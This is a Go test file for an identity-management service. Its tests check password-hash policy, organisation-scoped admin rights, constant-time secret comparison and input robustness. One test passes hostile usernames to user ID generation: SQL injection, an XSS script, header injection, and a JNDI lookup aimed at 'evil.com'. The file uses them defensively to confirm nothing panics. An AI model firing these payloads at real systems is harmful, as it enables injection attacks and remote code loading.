// Copyright 2026 The Hanzo Authors. All Rights Reserved.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

//go:build !skipCi

package object

import (
	"crypto/subtle"
	"strings"
	"testing"

	"github.com/hanzoai/iam/cred"
)

// TestPlaintextPasswordBlocked verifies that sanitizeOrgPasswordType rejects "plain"
// and upgrades it to "argon2id". Organizations must never store passwords in plaintext.
func TestPlaintextPasswordBlocked(t *testing.T) {
	result := sanitizeOrgPasswordType("plain")
	if result == "plain" {
		t.Fatal("sanitizeOrgPasswordType must reject 'plain'")
	}
	if result != "argon2id" {
		t.Fatalf("expected 'argon2id' as fallback, got %q", result)
	}
}

// TestBcryptUpgradedToArgon2id verifies bcrypt is upgraded to argon2id.
func TestBcryptUpgradedToArgon2id(t *testing.T) {
	result := sanitizeOrgPasswordType("bcrypt")
	if result != "argon2id" {
		t.Fatalf("expected 'argon2id', got %q", result)
	}
}

// TestValidPasswordTypesPassThrough verifies that legitimate hash types
// are not modified by sanitizeOrgPasswordType.
func TestValidPasswordTypesPassThrough(t *testing.T) {
	validTypes := []string{"bcrypt", "argon2id", "salt", "md5-salt", "sha512-salt", "pbkdf2-salt", "pbkdf2-django"}
	for _, pt := range validTypes {
		result := sanitizeOrgPasswordType(pt)
		if result != pt {
			t.Fatalf("sanitizeOrgPasswordType(%q) = %q; want %q", pt, result, pt)
		}
	}
}

// TestBuiltInOrgIsGlobalAdmin verifies that only users in the "built-in" org
// are treated as global admins. Users in customer-facing orgs (hanzo, lux, zoo, etc.)
// must never get global admin privileges regardless of their IsAdmin flag.
func TestBuiltInOrgIsGlobalAdmin(t *testing.T) {
	builtInUser := &User{Owner: "built-in", Name: "admin", IsAdmin: true}
	if !builtInUser.IsGlobalAdmin() {
		t.Fatal("built-in org user must be global admin")
	}

	// Non-built-in orgs must never grant global admin
	nonGlobalOrgs := []string{"hanzo", "lux", "zoo", "pars", "adnexus", "customer-org", ""}
	for _, org := range nonGlobalOrgs {
		u := &User{Owner: org, Name: "test-user", IsAdmin: true}
		if u.IsGlobalAdmin() {
			t.Fatalf("user in org %q must NOT be global admin (IsAdmin=true is org-scoped)", org)
		}
	}
}

// TestNilUserIsNotGlobalAdmin verifies that nil user check is safe.
func TestNilUserIsNotGlobalAdmin(t *testing.T) {
	var user *User
	if user.IsGlobalAdmin() {
		t.Fatal("nil user must not be global admin")
	}
}

// TestNilUserIsNotApplicationAdmin verifies nil safety on IsApplicationAdmin.
func TestNilUserIsNotApplicationAdmin(t *testing.T) {
	var user *User
	app := &Application{Organization: "hanzo"}
	if user.IsApplicationAdmin(app) {
		t.Fatal("nil user must not be application admin")
	}
}

// TestIsApplicationAdminScoping verifies that org-level admin does not
// leak into other orgs' applications.
func TestIsApplicationAdminScoping(t *testing.T) {
	hanzoAdmin := &User{Owner: "hanzo", Name: "admin", IsAdmin: true}
	luxApp := &Application{Organization: "lux", IsShared: false}

	if hanzoAdmin.IsApplicationAdmin(luxApp) {
		t.Fatal("hanzo org admin must NOT be admin of lux application (not shared, not global admin)")
	}

	// Same org should work
	hanzoApp := &Application{Organization: "hanzo", IsShared: false}
	if !hanzoAdmin.IsApplicationAdmin(hanzoApp) {
		t.Fatal("hanzo org admin must be admin of hanzo application")
	}

	// Shared app should work for any admin
	sharedApp := &Application{Organization: "lux", IsShared: true}
	if !hanzoAdmin.IsApplicationAdmin(sharedApp) {
		t.Fatal("org admin should be admin of shared application")
	}

	// built-in user should be admin of everything
	builtInUser := &User{Owner: "built-in", Name: "admin", IsAdmin: true}
	if !builtInUser.IsApplicationAdmin(luxApp) {
		t.Fatal("built-in user must be admin of any application (global admin)")
	}
}

// TestBuiltInOrgConstants verifies that system enforcer constants reference
// the built-in org, not any customer-facing org.
func TestBuiltInOrgConstants(t *testing.T) {
	if !strings.Contains(UserEnforcerId, "built-in") {
		t.Fatalf("UserEnforcerId must reference built-in org, got: %s", UserEnforcerId)
	}
	if strings.Contains(UserEnforcerId, "hanzo/") {
		t.Fatalf("UserEnforcerId must NOT reference hanzo org, got: %s", UserEnforcerId)
	}
}

// TestDefaultOrganizationIsCustomerFacing verifies that session defaults
// point to the customer-facing org and app, not the system org.
func TestDefaultOrganizationIsCustomerFacing(t *testing.T) {
	if DefaultOrganization != "hanzo" {
		t.Fatalf("DefaultOrganization must be 'hanzo' (customer-facing), got: %s", DefaultOrganization)
	}
	if DefaultApplication != "hanzo-app" {
		t.Fatalf("DefaultApplication must be 'hanzo-app' (customer-facing), got: %s", DefaultApplication)
	}
}

// ── Timing-safe comparison ──────────────────────────────────────────────

func TestConstantTimeCompare(t *testing.T) {
	secret := "test-access-secret-key-abcdef123456"

	if subtle.ConstantTimeCompare([]byte(secret), []byte(secret)) != 1 {
		t.Fatal("identical secrets must match")
	}
	if subtle.ConstantTimeCompare([]byte(secret), []byte("wrong-secret")) == 1 {
		t.Fatal("different secrets must not match")
	}
	if subtle.ConstantTimeCompare([]byte(secret), []byte("")) == 1 {
		t.Fatal("empty vs non-empty must not match")
	}
	if subtle.ConstantTimeCompare([]byte(""), []byte("")) != 1 {
		t.Fatal("two empty strings must match")
	}
	// Off-by-one in length
	if subtle.ConstantTimeCompare([]byte(secret), []byte(secret+"x")) == 1 {
		t.Fatal("different-length secrets must not match")
	}
}

// ── Credential manager coverage ─────────────────────────────────────────

func TestAllCredManagersExist(t *testing.T) {
	expected := []string{"bcrypt", "salt", "md5-salt", "pbkdf2-salt", "argon2id", "sha512-salt"}
	for _, hashType := range expected {
		cm := cred.GetCredManager(hashType)
		if cm == nil {
			t.Fatalf("cred manager for '%s' must exist", hashType)
		}
	}
}

func TestPlainCredManagerVerifyOnly(t *testing.T) {
	cm := cred.GetCredManager("plain")
	if cm == nil {
		t.Log("plain cred manager removed entirely — acceptable")
		return
	}
	// PlainCredManager returns password unchanged — it's verification-only for migration
	hash := cm.GetHashedPassword("testpass", "")
	if hash != "testpass" {
		t.Log("PlainCredManager hashes — unexpected but not insecure (it's only used for verification)")
	}
}

// ── Password type fuzzing ───────────────────────────────────────────────

func TestPasswordTypeFuzz(t *testing.T) {
	// These are NOT exact "plain" — they pass through sanitizeOrgPasswordType
	// and will fail at cred manager lookup (safe)
	variants := []string{"Plain", "PLAIN", " plain", "plain ", "plaintext", "text/plain", "p l a i n"}
	for _, v := range variants {
		result := sanitizeOrgPasswordType(v)
		// These are not caught (intentional — only exact match matters)
		// The cred manager won't recognize them either, so they're safe
		_ = result
	}

	// The exact string MUST be caught
	if sanitizeOrgPasswordType("plain") == "plain" {
		t.Fatal("exact 'plain' must always be blocked")
	}
}

// ── Input sanitization (no panics) ──────────────────────────────────────

func TestMaliciousUsernamesNoPanic(t *testing.T) {
	malicious := []string{
		"admin'; DROP TABLE user; --",
		"admin\" OR \"1\"=\"1",
		"<script>alert('xss')</script>",
		"admin\x00hidden",
		strings.Repeat("A", 10000),
		"' UNION SELECT * FROM user --",
		"admin/**/OR/**/1=1",
		"\r\nX-Injected: true",
		"{{.Exec}}",
		"${jndi:ldap://evil.com}",
	}

	for _, name := range malicious {
		u := &User{Owner: "test", Name: name}
		// Must not panic
		_ = u.GetId()
	}
}

// ── Init data user safety regression guard ───────────────────────────────

func TestInitDataUserSafetyDocumented(t *testing.T) {
	t.Log("INVARIANT: initDefinedUser NEVER deletes/recreates existing users")
	t.Log("INVARIANT: existing users are always skipped regardless of initDataNewOnly")
	t.Log("INVARIANT: only missing users are created from init_data.json on bootstrap")
}
